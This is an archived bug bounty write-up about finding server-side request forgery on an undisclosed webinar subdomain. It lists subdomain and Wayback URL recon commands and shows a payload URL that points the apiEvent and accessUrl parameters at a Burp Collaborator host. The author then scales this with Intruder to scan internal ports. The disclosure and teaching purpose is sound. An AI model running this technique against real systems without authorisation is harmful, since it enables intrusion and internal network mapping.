---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-06_bug-bounty-how-i-found-an-ssrf-reconnaissance.md
original_filename: 2022-09-06_bug-bounty-how-i-found-an-ssrf-reconnaissance.md
title: Bug Bounty { How I found an SSRF ( Reconnaissance ) }
category: documents
detected_topics:
- ssrf
- idor
- command-injection
- otp
- rate-limit
- automation-abuse
tags:
- imported
- documents
- ssrf
- idor
- command-injection
- otp
- rate-limit
- automation-abuse
language: en
raw_sha256: 704a4af549ffec78295bae5045e38765b44e4d91d10d494472b3f473b2b59251
text_sha256: 8ea4d3ad9c51a5eaf337a3196b92bc8608dd5d2cb7d5b5cca0e15f2d8d588de1
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Bug Bounty { How I found an SSRF ( Reconnaissance ) }

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-06_bug-bounty-how-i-found-an-ssrf-reconnaissance.md
- Source Type: markdown
- Detected Topics: ssrf, idor, command-injection, otp, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `704a4af549ffec78295bae5045e38765b44e4d91d10d494472b3f473b2b59251`
- Text SHA256: `8ea4d3ad9c51a5eaf337a3196b92bc8608dd5d2cb7d5b5cca0e15f2d8d588de1`


## Content

---
title: "Bug Bounty { How I found an SSRF ( Reconnaissance ) }"
url: "https://srahulceh.medium.com/bug-bounty-how-i-found-an-ssrf-reconnaissance-7b1821a1b1fd"
authors: ["S Rahul (@7srambo)"]
bugs: ["SSRF"]
publication_date: "2022-09-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2212
scraped_via: "browseros"
---

# Bug Bounty { How I found an SSRF ( Reconnaissance ) }

Bug Bounty { How I found an SSRF ( Reconnaissance ) }
S Rahul
Follow
5 min read
·
Sep 7, 2022

656

9

Hello everyone, I am S Rahul, working as a Information Security Analyst at NUK 9 Auditors and A Bug bounty hunter at Hackerone, Bugcrowd etc. A well-rounded IT professional with 2+ years of cyber security experience.

Today I am going to discuss my recent finding, which is Server-Side Request Forgery (SSRF) to Internal Port Scanning.

What is SSRF ?

Press enter or click to view image in full size

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems. SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorised actions. These trust relationships might exist in relation to the server itself, or in relation to other back-end systems within the same organization. To learn more, you can refer to the PortSwigger Web Security Academy.

What exactly is WaybackURLs (Wayback Machine)?

Web crawling in security testing is an important aspect as this is the process of indexing data on web pages by using automated scripts or crawling programs. These scripts or crawling programmes are known as web crawlers, spiders, spider bots, and crawlers. Waybackurls is also a Golang-based script or tool used for crawling domains and fetching known URLs from Wayback Machines, also known as Archives for *.target.com.To learn more about waybackurls and the installation process, you can refer to waybackurls.

Let’s begin with our main topic i.e. how I found an SSRF using Reconnaissance.

I have selected a bug bounty program through Google Dorks. Due to their responsible disclosure policy, I can’t disclose the program. Let us call the domain as target.com.

First, I did subdomain enumeration through the subfinder tool and saved the output in domains.txt. After that, I ran the httpprobe tool on domains.txt to get the live domains and saved the output in live_domains.txt.

subfinder -d target.com > domains.txt

cat domains.txt | httprobe > live_domains.txt

Now I run the following command to collect web crawling urls through waybackurls.

cat live_domains.txt | waybackurls > urls.txt

Once I collected all the urls in urls.txt , I ran the httpx tool to identify the status, title, tech, etc. and saved the output in status.txt.

cat urls.txt | httpx — status-code-title > status.txt

Now I have sorted all the URLs that are live and accessable, and I have removed all the non-working URLs. That makes my recon simple.

I opened the status.txt and started looking for sensitive information, parameters, usernames, passwords, tokens, sensitive files, etc.

Keywords I used : password, username, mail.com, token, access_token, url=, redirect_url=, api, id=, accessUrl=, payment, etc.

After 30 minutes of crawling and sorting, I got one interesting url that is like

Get S Rahul’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://subdomain.target.com/webinar/?roomId=1ec1f5d8-0887-4fbb-a3dc-1b9f94bc04dc&displayName=mack&accessToken=sda3-q23aed-aerae&peerId=123123-321as-waaew-ads&api Event=https://example.com/api/meet&accessUrl=https://example.com/api/accessCheck/&itisparticipant=true&nameScreenDisabled=true&startWithFS=true&controlsDisabled=true

My attention was drawn to the parameters “apiEvent” and “accessUrl””

Now i have replaced the parameter urls with my Burp collabartor server

After replacing with burp collab server, Url look like this:

https://subdomain.target.com/webinar/?roomId=1ec1f5d8-0887-4fbb-a3dc-1b9f94bc04dc&displayName=Tom&accessToken=sda3-q23aed-aerae&peerId=123123-321as-waaew-ads&apiEvent=https://rni1e5x29hzirz847fkvnolaf1lr9g.burpcollaborator.net/api/meet&accessUrl=https://rni1e5x29hzirz847fkvnolaf1lr9g.burpcollaborator.net/api/accessCheck/&itisparticipant=true&nameScreenDisabled=true&startWithFS=true&controlsDisabled=true

Now I opened the url in the browser and I got DNS and HTTP on my collabartor server with their internal IP

Now i have done whois to confirm whether this IP address is of their organisation or a third-party.
whois ip

I got confirmation that the IP I got is the internal IP of the organization.

Now quickly to increase the impact, I have fired my burpsuite and 1. captured the same request in burpsuite > 2.sended it to the intruder >3. selected a pitchfork attack type > 4.position payload added at ended of 2 urls >5.Set the loop request to 100 > 6.Started the attack > 7. I got http,dns,smtp requests

Press enter or click to view image in full size
Step 1
Press enter or click to view image in full size
Step 2,3,4
Press enter or click to view image in full size
Step 4,5
Press enter or click to view image in full size
Step 6
Press enter or click to view image in full size
Step 7

Now I got DNS and HTTP requests, as well as an SMTP request in my Burp collab server, confirming that I was able to perform internal port scanning using the SSRF vulnerability.

I quickly made the poc and reported it to the bug bounty program.

Reported : Aug 5, 2022

Response : Aug 12, 2022 Hello!
We would like to ask you, what is the best way to exploit this vulnerability? What consequences do you see in using this vulnerability?
is it just information disclosure or it can be exploited somehow else?

Reported: Given a brief information, what an attacker can do by this vulnerability and what are possible ways to exploit it such as Consequences of the SSRF vulnerability :- SSRF leads to Internal IP disclosure, SSRF leads to Internal Port scanning

Response: Aug 18, 2022 Triage and Rewarded with $$$ bounty

Thanks for reading guys.

Don’t forget to follow and connect with me through Instagram, LinkedIn, Twitter .
